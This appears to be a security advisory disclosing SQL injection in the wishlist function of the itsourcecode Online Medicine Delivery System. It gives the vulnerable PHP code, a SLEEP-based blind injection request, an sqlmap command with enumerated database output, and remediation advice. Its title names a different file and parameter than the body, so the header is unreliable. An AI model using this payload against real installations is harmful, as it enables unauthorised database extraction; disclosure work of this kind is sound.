# itsourcecode Online Medicine Delivery System V1.0 - SQL Injection Vulnerability via 'id' Parameter in '/rider/orders/controller.php'
---

## 1. Product Information
| Field | Value |
| --- | --- |
| **Product Name** | Online Medicine Delivery System |
| **Product Link** | [https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/](https://itsourcecode.com/free-projects/php-project/complete-online-medicine-delivery-system-with-sms-notification-in-php/) |
| **Vendor** | itsourcecode |
| **Affected Version** | V1.0 |
| **Authentication Required** | Yes, requires Customer login session |


## 2. Vulnerability Type
**SQL Injection**

---

## 3. Vulnerability Description
The customer Wishlist operation interface `/customer/controller.php` of Online Medicine Delivery System contains an SQL injection vulnerability:

`addwishlist()`** function (action=addwish)**: The `proid` parameter is sequentially concatenated into both SELECT and INSERT SQL statements; it first queries whether a record already exists, and if not, inserts a new record.

This vulnerability requires a Customer login session, but an attacker can combine it with the Customer authentication SQL injection bypass of this system to obtain a Customer session without knowing the password.

**Affected Code**:

`customer/controller.php:268-285`

```php
function addwishlist(){
    global $mydb;
    $proid = $_GET['proid'];
    $id =$_SESSION['CUSID'];
    $query="SELECT * FROM `tblwishlist` WHERE  CUSID=".$id." AND `PROID` =" .$proid ;
    $mydb->setQuery($query);
    // ...
    $query ="INSERT INTO `tblwishlist` (`PROID`, `CUSID`, `WISHDATE`, `WISHSTATS`)  VALUES ('{$proid}','{$id}','".DATE('Y-m-d')."',0)";
    $mydb->setQuery($query);
    $mydb->executeQuery();
}
```

---

## 4. Impact
+ **Data Disclosure**: Through SELECT injection via the `proid` parameter, arbitrary database data can be extracted

---

## 5. PoC
**PoC — proid parameter time-based blind injection**:

```plain
GET /customer/controller.php?action=addwish&proid=1' AND (SELECT 9897 FROM (SELECT(SLEEP(5)))RZXW) AND 'NlOs'='NlOs HTTP/1.1
Host: ******
Cookie: PHPSESSID=<customer_session>
Connection: close
```

**sqlmap database enumeration**:

```bash
python sqlmap.py -u "http://******/customer/controller.php?action=addwish&proid=1" --cookie="PHPSESSID=<customer_session>" -p proid --batch --dbs --dbms=mysql
```

Result:

```plain
available databases [6]:
[*] information_schema
[*] medicinedb
[*] mysql
[*] performance_schema
[*] roocms
[*] sys
```

sqlmap execution screenshot:

![image-20260716192859239](C:\Users\Shawn\AppData\Roaming\Typora\typora-user-images\image-20260716192859239.png)

---

## 6. Remediation
1. **Use Parameterized Queries**
2. **Input Type Validation**: `wishid` and `proid` should be integers

